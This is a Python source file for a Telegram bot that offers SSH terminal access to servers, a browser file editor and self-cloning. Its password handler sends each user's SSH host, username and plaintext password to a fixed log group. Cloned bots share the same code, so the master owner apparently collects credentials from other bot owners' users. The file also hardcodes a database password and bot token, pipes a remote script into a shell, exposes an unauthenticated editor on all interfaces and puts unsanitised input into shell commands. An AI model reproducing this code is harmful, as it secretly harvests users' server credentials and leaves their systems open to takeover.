import asyncio
import paramiko
import random
import threading
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from pymongo import MongoClient
import logging
import time

# Define conversation states
SSH, TRUSTED, PASSWORD, TERMINAL = range(4)

# MongoDB setup
MONGO_URI = "mongodb+srv://testbindark:65I379zmYZzefXmm@clus.xg5n6.mongodb.net/"
client = MongoClient(MONGO_URI)
db = client["ssh_bot_db"]
bots_collection = db["bots"]

# Constants
MAIN_OWNER_ID = "1094941160"  # @h_oneysingh's Telegram ID
LOG_GROUP_ID = -1002335903626  # Your log group ID
MAIN_BOT_TOKEN = "7891611632:AAFptf8qIr1ZOeYzghGVnPpSOpOtq8U8Z6Q"  # Valid token

# Store runtime data
user_data = {}
ssh_sessions = {}
bot_instances = {}  # {bot_token: Application}
port_forwards = {}  # {chat_id: {"thread": Thread, "port": int, "process": Process}}
clone_attempts = {}  # {token: attempts}

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def log_to_group(context: ContextTypes.DEFAULT_TYPE, message: str):
    try:
        await context.bot.send_message(chat_id=LOG_GROUP_ID, text=message[:4000])
    except Exception as e:
        logger.error(f"Failed to log to group: {str(e)}")

def setup_web_editor(ssh_client, chat_id, file_path):
    try:
        port = random.randint(8000, 9000)
        stdin, stdout, stderr = ssh_client.exec_command(f"netstat -tuln | grep :{port}")
        if stdout.read().decode().strip():
            return None, "Port already in use"
        
        install_cmd = (
            "curl -fsSL https://code-server.dev/install.sh | sh -s -- --prefix=/tmp/code-server && "
            f"/tmp/code-server/bin/code-server --port {port} --auth none --host 0.0.0.0 {file_path} &"
        )
        ssh_client.exec_command(install_cmd)
        time.sleep(3)
        
        def forward_port():
            ssh_cmd = (
                f"ssh -L {port}:localhost:{port} -N "
                f"{user_data[chat_id]['username']}@{user_data[chat_id]['ip']}"
            )
            process = subprocess.Popen(ssh_cmd, shell=True)
            port_forwards[chat_id]["process"] = process
            process.wait()
        
        port_thread = threading.Thread(target=forward_port)
        port_thread.start()
        
        port_forwards[chat_id] = {"thread": port_thread, "port": port, "process": None}
        return port, None
    except Exception as e:
        return None, str(e)

def cleanup_web_editor(ssh_client, chat_id):
    try:
        if chat_id in port_forwards:
            ssh_client.exec_command("pkill -f code-server")
            ssh_client.exec_command("rm -rf /tmp/code-server")
            
            if "process" in port_forwards[chat_id] and port_forwards[chat_id]["process"]:
                try:
                    port_forwards[chat_id]["process"].terminate()
                    port_forwards[chat_id]["process"].wait(timeout=5)
                except Exception:
                    port_forwards[chat_id]["process"].kill()
            
            if "thread" in port_forwards[chat_id]:
                port_forwards[chat_id]["thread"].join(timeout=2)
            
            del port_forwards[chat_id]
    except Exception as e:
        logger.error(f"Cleanup error for {chat_id}: {str(e)}")

async def cleanup_session(chat_id, ssh_client, context):
    """Centralized function to clean up SSH session and resources."""
    try:
        # Clean up web editor if active
        cleanup_web_editor(ssh_client, chat_id)
        
        # Close SSH connection
        ssh_client.close()
        
        # Remove session data
        if chat_id in ssh_sessions:
            del ssh_sessions[chat_id]
        if chat_id in user_data:
            del user_data[chat_id]
        
        # Update MongoDB
        bots_collection.update_one(
            {"token": context.bot.token},
            {"$unset": {f"ssh_sessions.{chat_id}": ""}}
        )
        
        await log_to_group(context, f"User {chat_id} logged out and cleaned up.")
        return True
    except Exception as e:
        logger.error(f"Error during session cleanup for {chat_id}: {str(e)}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = str(update.effective_user.id)
    bot_data = bots_collection.find_one({"token": context.bot.token})
    
    if user_id == MAIN_OWNER_ID:
        stats = (
            f"Bot Stats:\n"
            f"- Active Bots: {len(bot_instances)}\n"
            f"- Active SSH Sessions: {len(ssh_sessions)}\n"
            f"- Cloned Bots: {bots_collection.count_documents({'token': {'$ne': MAIN_BOT_TOKEN}})}"
        )
        commands = (
            "Welcome, Master Owner (@h_oneysingh)!\n\n"
            "Commands:\n"
            "/ssh username@ip - Start an SSH session\n"
            "/nano <file_path> - Edit files in browser\n"
            "/logout - Disconnect SSH and cleanup\n"
            "/clone <new_bot_token> - Clone this bot\n"
            "/addsudo <user_id> - Add sudo user\n"
            "/removesudo <user_id> - Remove sudo user\n"
            "/show_owner - Show bot owner\n"
            "/broadcast <message> - Broadcast to all bots\n"
            "/cancel - Cancel current session\n\n"
            f"{stats}"
        )
        await update.message.reply_text(commands)
    
    elif bot_data and user_id == bot_data["owner_id"]:
        commands = (
            f"Welcome, Bot Owner!\n\n"
            "Commands:\n"
            "/ssh username@ip - Start an SSH session\n"
            "/nano <file_path> - Edit files in browser\n"
            "/logout - Disconnect SSH and cleanup\n"
            "/addsudo <user_id> - Add sudo user (for this bot)\n"
            "/removesudo <user_id> - Remove sudo user (for this bot)\n"
            "/show_owner - Show this bot's owner\n"
            "/clone <new_bot_token> - Clone this bot again\n"
            "/cancel - Cancel current session"
        )
        await update.message.reply_text(commands)
    
    elif bot_data and user_id in bot_data.get("sudo_users", []):
        commands = (
            "Welcome, Sudo User!\n\n"
            "Commands:\n"
            "/ssh username@ip - Start an SSH session\n"
            "/nano <file_path> - Edit files in browser\n"
            "/logout - Disconnect SSH and cleanup\n"
            "/clone <new_bot_token> - Clone this bot\n"
            "/cancel - Cancel current session"
        )
        await update.message.reply_text(commands)
    
    else:
        commands = (
            "Welcome!\n\n"
            "Commands:\n"
            "/ssh username@ip - Start an SSH session\n"
            "/nano <file_path> - Edit files in browser\n"
            "/logout - Disconnect SSH and cleanup\n"
            "/clone <new_bot_token> - Clone this bot\n"
            "/cancel - Cancel current session"
        )
        await update.message.reply_text(commands)
    
    await log_to_group(context, f"User {user_id} started bot.")
    return ConversationHandler.END

async def ssh_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ssh_input = update.message.text.split(" ", 1)
    if len(ssh_input) < 2:
        await update.message.reply_text("Please provide username@ip, e.g., /ssh user@192.168.1.1")
        return ConversationHandler.END
    
    username_ip = ssh_input[1].strip()
    if "@" not in username_ip:
        await update.message.reply_text("Invalid format. Use username@ip.")
        return ConversationHandler.END
    
    username, ip = username_ip.split("@")
    user_data[update.message.chat_id] = {"username": username, "ip": ip}
    
    await update.message.reply_text(f"Attempting SSH to {ip}. Is this host trusted? Reply 'trusted yes' or 'no'.")
    await log_to_group(context, f"User {update.effective_user.id} initiated SSH to {username}@{ip}")
    return TRUSTED

async def trusted_response(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.message.chat_id
    if chat_id not in user_data:
        await update.message.reply_text("Session expired. Start again with /ssh.")
        return ConversationHandler.END
    
    response = update.message.text.lower().strip()
    if response != "trusted yes":
        await update.message.reply_text("SSH aborted. Host not trusted.")
        del user_data[chat_id]
        return ConversationHandler.END
    
    await update.message.reply_text("Host trusted. Please enter the password:")
    return PASSWORD

async def password_response(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.message.chat_id
    if chat_id not in user_data:
        await update.message.reply_text("Session expired. Start again with /ssh.")
        return ConversationHandler.END
    
    password = update.message.text.strip()
    username = user_data[chat_id]["username"]
    ip = user_data[chat_id]["ip"]
    
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(ip, username=username, password=password, timeout=10)
        ssh_sessions[chat_id] = ssh_client
        bots_collection.update_one(
            {"token": context.bot.token},
            {"$set": {f"ssh_sessions.{chat_id}": {"username": username, "ip": ip}}},
            upsert=True
        )
        await update.message.reply_text(f"Connected to {username}@{ip}! Send commands or use /logout.")
        await log_to_group(context, f"User {update.effective_user.id} connected to {username}@{ip} with password: {password}")
        return TERMINAL
    except Exception as e:
        await update.message.reply_text(f"SSH error: {str(e)}")
        del user_data[chat_id]
        return ConversationHandler.END

async def terminal_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.message.chat_id
    if chat_id not in ssh_sessions:
        await update.message.reply_text("No active SSH session. Start with /ssh.")
        return ConversationHandler.END
    
    command = update.message.text.strip()
    ssh_client = ssh_sessions[chat_id]
    
    if command.lower() == "/logout":
        success = await cleanup_session(chat_id, ssh_client, context)
        if success:
            await update.message.reply_text("Logged out from VPS. All resources cleaned up.")
        else:
            await update.message.reply_text("Logout failed. Please try again or use /cancel.")
        return ConversationHandler.END
    
    if command.startswith("/nano "):
        file_path = command[len("/nano "):].strip()
        if not file_path:
            await update.message.reply_text("Usage: /nano <file_path>")
            return TERMINAL
        
        stdin, stdout, stderr = ssh_client.exec_command(f"test -f {file_path} && echo exists")
        if not stdout.read().decode().strip():
            await update.message.reply_text(f"File {file_path} does not exist on the server.")
            return TERMINAL
        
        port, error = setup_web_editor(ssh_client, chat_id, file_path)
        if error:
            await update.message.reply_text(f"Failed to setup editor: {error}")
            return TERMINAL
        
        link = f"http://localhost:{port}"
        await update.message.reply_text(
            f"Open this link in your browser to edit {file_path}:\n{link}\n"
            "Save your changes in the editor. Use /logout to disconnect and cleanup."
        )
        await log_to_group(context, f"User {update.effective_user.id} opened editor for {file_path} at {link}")
        return TERMINAL
    
    try:
        stdin, stdout, stderr = ssh_client.exec_command(command, timeout=10)
        output = stdout.read().decode("utf-8").strip()
        error = stderr.read().decode("utf-8").strip()
        response = output or error or "No output."
        await update.message.reply_text(response[:4000])
        await log_to_group(context, f"User {update.effective_user.id} executed: {command}\nOutput: {response[:100]}")
    except Exception as e:
        await update.message.reply_text(f"Error executing command: {str(e)}")
    
    return TERMINAL

async def clone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /clone <new_bot_token>")
        return
    
    new_token = context.args[0]
    clone_attempts[new_token] = clone_attempts.get(new_token, 0)
    
    async def attempt_start():
        try:
            new_app = Application.builder().token(new_token).build()
            setup_handlers(new_app)
            bot_instances[new_token] = new_app
            
            bots_collection.update_one(
                {"token": new_token},
                {"$set": {
                    "owner_id": str(update.effective_user.id),
                    "sudo_users": [],
                    "ssh_sessions": {},
                    "attempts": clone_attempts[new_token]
                }},
                upsert=True
            )
            
            await new_app.initialize()
            await new_app.start()
            await update.message.reply_text(f"Bot cloned with token {new_token} and started!")
            await log_to_group(context, f"User {update.effective_user.id} cloned bot with token {new_token}")
            clone_attempts[new_token] = 0
        except Exception as e:
            clone_attempts[new_token] += 1
            logger.error(f"Clone attempt {clone_attempts[new_token]} failed for {new_token}: {str(e)}")
            if clone_attempts[new_token] >= 3:
                bots_collection.delete_one({"token": new_token})
                if new_token in bot_instances:
                    del bot_instances[new_token]
                del clone_attempts[new_token]
                await update.message.reply_text(f"Failed to clone {new_token} after 3 attempts. Removed from database.")
                await log_to_group(context, f"Removed {new_token} after 3 failed attempts.")
            else:
                await update.message.reply_text(f"Attempt {clone_attempts[new_token]} failed: {str(e)}. Retrying...")
                await asyncio.sleep(5)
                await attempt_start()

    asyncio.create_task(attempt_start())

async def addsudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bot_data = bots_collection.find_one({"token": context.bot.token})
    if str(update.effective_user.id) != MAIN_OWNER_ID and (not bot_data or str(update.effective_user.id) != bot_data["owner_id"]):
        await update.message.reply_text("Only owners can add sudo users.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addsudo <user_id>")
        return
    
    user_id = context.args[0]
    bots_collection.update_one({"token": context.bot.token}, {"$addToSet": {"sudo_users": user_id}})
    await update.message.reply_text(f"Added {user_id} as sudo.")
    await log_to_group(context, f"User {update.effective_user.id} added sudo {user_id}")

async def removesudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bot_data = bots_collection.find_one({"token": context.bot.token})
    if str(update.effective_user.id) != MAIN_OWNER_ID and (not bot_data or str(update.effective_user.id) != bot_data["owner_id"]):
        await update.message.reply_text("Only owners can remove sudo users.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removesudo <user_id>")
        return
    
    user_id = context.args[0]
    bots_collection.update_one({"token": context.bot.token}, {"$pull": {"sudo_users": user_id}})
    await update.message.reply_text(f"Removed {user_id} from sudo.")
    await log_to_group(context, f"User {update.effective_user.id} removed sudo {user_id}")

async def show_owner(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bot_data = bots_collection.find_one({"token": context.bot.token})
    if str(update.effective_user.id) != MAIN_OWNER_ID and (not bot_data or str(update.effective_user.id) != bot_data["owner_id"]):
        await update.message.reply_text("Only owners can see this.")
        return
    owner = "@h_oneysingh" if str(update.effective_user.id) == MAIN_OWNER_ID else bot_data["owner_id"]
    await update.message.reply_text(f"Bot Owner: {owner}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.effective_user.id) != MAIN_OWNER_ID:
        await update.message.reply_text("Only the master owner (@h_oneysingh) can broadcast.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    message = " ".join(context.args)
    for token, app in list(bot_instances.items()):
        try:
            await app.bot.send_message(chat_id=LOG_GROUP_ID, text=f"Broadcast: {message}")
            await log_to_group(context, f"Broadcasted to bot {token}: {message}")
        except Exception as e:
            logger.error(f"Failed to broadcast to {token}: {str(e)}")
    await update.message.reply_text("Broadcast sent to all bots.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.message.chat_id
    if chat_id in ssh_sessions:
        await cleanup_session(chat_id, ssh_sessions[chat_id], context)
    if chat_id in user_data:
        del user_data[chat_id]
    await update.message.reply_text("SSH session cancelled and cleaned up.")
    return ConversationHandler.END

def setup_handlers(application: Application) -> None:
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("ssh", ssh_command)],
        states={
            TRUSTED: [MessageHandler(filters.TEXT & ~filters.COMMAND, trusted_response)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_response)],
            TERMINAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, terminal_command)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("clone", clone))
    application.add_handler(CommandHandler("addsudo", addsudo))
    application.add_handler(CommandHandler("removesudo", removesudo))
    application.add_handler(CommandHandler("show_owner", show_owner))
    application.add_handler(CommandHandler("broadcast", broadcast))

async def run_all_bots():
    try:
        main_app = Application.builder().token(MAIN_BOT_TOKEN).build()
        setup_handlers(main_app)
        bot_instances[MAIN_BOT_TOKEN] = main_app
        
        bots_collection.update_one(
            {"token": MAIN_BOT_TOKEN},
            {"$set": {"owner_id": MAIN_OWNER_ID, "sudo_users": [], "ssh_sessions": {}}},
            upsert=True
        )
        
        await main_app.initialize()
        await main_app.start()
        await main_app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        
        cloned_tasks = []
        for bot in bots_collection.find({"token": {"$ne": MAIN_BOT_TOKEN}}):
            try:
                app = Application.builder().token(bot["token"]).build()
                setup_handlers(app)
                bot_instances[bot["token"]] = app
                cloned_tasks.append(app.initialize())
                cloned_tasks.append(app.start())
                cloned_tasks.append(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
                logger.info(f"Initialized and started cloned bot with token {bot['token']}")
            except Exception as e:
                logger.error(f"Failed to start cloned bot {bot['token']}: {str(e)}")
        
        await asyncio.gather(*cloned_tasks, return_exceptions=True)
        
        logger.info("All bots started successfully")
        while True:
            await asyncio.sleep(1)
    except Exception as e:
        logger.error(f"Error in run_all_bots: {str(e)}")
    finally:
        logger.info("Shutting down all bots...")
        for token, app in list(bot_instances.items()):
            try:
                await app.updater.stop()
                await app.stop()
                await app.shutdown()
            except Exception as e:
                logger.error(f"Error shutting down bot {token}: {str(e)}")

async def main():
    await run_all_bots()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logger.error(f"Main execution error: {str(e)}")
